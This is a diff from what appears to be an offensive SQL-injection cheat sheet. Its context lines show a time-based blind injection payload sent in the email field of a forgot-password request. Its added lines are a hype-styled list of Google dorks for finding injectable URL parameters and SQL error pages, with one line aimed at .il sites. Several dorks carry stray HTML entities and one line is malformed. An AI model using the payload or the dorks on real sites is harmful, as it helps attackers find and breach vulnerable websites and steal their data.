@@ -624,6 +624,31 @@ POST /forgetpassword.asp HTTP/1.1
 
 email=ali@gmail.com';%20waitfor%20delay%20'0:0:8'%20--%20
 
+Use SQLI google dorks list to find hidden parameters
+👇🔥
+
+site:*.com inurl:&#8221;main.php?id=
+site:*.com inurl:zoom.php?id=site:.il
+site:*.com inurl:&#8221;details.php?id=
+site:*.com inurl:&#8221;?came=
+site:*.com inurl:&#8221;index.php?page=
+site:*.com inurl:&#8221;index.php?page=
+site:*.com inurl:&#8221;home.php?cat=
+site:*.com inurl:&#8221;main.php?t=
+site:*.com inurl:&#8221;games.php?id=
+site:*.com inurl:&#8221;guide.php?id=
+site:*.com inurl:&#8221;index.php?cat=
+site:*.com intext:"error in your SQL syntax"
+
+
+
+
+
+
+
+
+
+
 
 
 ----------------------------------------------------------------------------------------------
